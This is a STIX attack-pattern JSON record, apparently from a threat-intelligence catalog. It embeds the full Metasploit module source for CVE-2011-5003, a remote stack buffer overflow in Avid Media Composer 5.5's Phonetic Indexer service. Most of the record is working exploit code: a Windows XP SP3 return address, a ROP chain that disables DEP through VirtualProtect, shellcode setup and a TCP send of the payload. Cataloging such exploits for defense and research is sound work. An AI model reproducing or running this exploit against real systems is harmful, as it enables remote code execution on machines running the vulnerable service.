{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--397f443d-f602-4ce0-85f5-d6fd53dd9834",
    "created": "2024-08-14T16:47:10.394606Z",
    "modified": "2024-08-14T16:47:10.39461Z",
    "name": "\"Avid Media Composer 5.5 - Avid Phonetic Indexer Buffer Overflow\"",
    "description": " This module exploits a stack buffer overflow in process AvidPhoneticIndexer.exe (port 4659), which comes as part of the Avid Media Composer 5.5 Editing Suite. This daemon sometimes starts on a different port; if you start it standalone it will run on port 4660.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/avidphoneticindexer.rb",
            "external_id": "avidphoneticindexer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5003"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-assessment.com/files/documents/advisory/Avid_Media_Composer-Phonetic_Indexer-Remote_Stack_Buffer_Overflow.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Avid Media Composer 5.5 - Avid Phonetic Indexer Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in process\n        AvidPhoneticIndexer.exe (port 4659), which comes as part of the Avid Media Composer\n        5.5 Editing Suite. This daemon sometimes starts on a different port; if you start\n        it standalone it will run on port 4660.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'vt [nick.freeman@security-assessment.com]',\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-5003'],\n          ['OSVDB', '77376'],\n          [ 'URL', 'http://www.security-assessment.com/files/documents/advisory/Avid_Media_Composer-Phonetic_Indexer-Remote_Stack_Buffer_Overflow.pdf' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1012,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\",\n          'DisableNops' => true,\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'EAX',\n            }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP Professional SP3',\n            {\n              'Ret' => 0x028B35EB #ADD ESP, 1800; RET (il.dll)\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-11-29',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(4659),\n      ])\n  end\n\n  def exploit\n    rop_gadgets = [\n      # ROP chain (sayonara) courtesy of WhitePhosphorus (thanks guys!)\n      # a non-sayonara ROP would be super easy too, I'm just lazy :)\n      0x7C344CC1,  # pop eax;ret;\n      0x7C3410C2, # pop ecx;pop ecx;ret;\n      0x7C342462, # xor chain; call eax {0x7C3410C2}\n      0x7C38C510, # writeable location for lpflOldProtect\n      0x7C365645, # pop esi;ret;\n      0x7C345243, # ret;\n      0x7C348F46, # pop ebp;ret;\n      0x7C3487EC, # call eax\n      0x7C344CC1, # pop eax;ret;\n      0xfffffbfc, # {size}\n      0x7C34D749, # neg eax;ret; {adjust size}\n      0x7C3458AA, # add ebx, eax;ret; {size into ebx}\n      0x7C3439FA, # pop edx;ret;\n      0xFFFFFFC0, # {flag}\n      0x7C351EB1, # neg edx;ret; {adjust flag}\n      0x7C354648, # pop edi;ret;\n      0x7C3530EA, # mov eax,[eax];ret;\n      0x7C344CC1, # pop eax;ret;\n      0x7C37A181, # (VP RVA + 30) - {0xEF adjustment}\n      0x7C355AEB, # sub eax,30;ret;\n      0x7C378C81, # pushad; add al,0xef; ret;\n      0x7C36683F, # push esp;ret;\n    ].pack(\"V*\")\n\n    # need to control a buffer reg for the msf gen'd payload to fly. in this case:\n    bufregfix = \"\\x8b\\xc4\"       # MOV EAX,ESP\n    bufregfix += \"\\x83\\xc0\\x10\"  # ADD EAX,10\n\n    connect\n    sploit  = ''\n    sploit << rand_text_alpha_upper(216)\n    sploit << [target.ret].pack('V*')\n    sploit << \"A\"*732  #This avoids a busted LoadLibrary\n    sploit << rop_gadgets\n    sploit << bufregfix\n    sploit << \"\\xeb\\x09\"\n    sploit << rand_text_alpha_upper(9)\n    sploit << payload.encoded\n    sock.put(sploit)\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-29",
    "x_mitre_platforms": [
        "win'"
    ]
}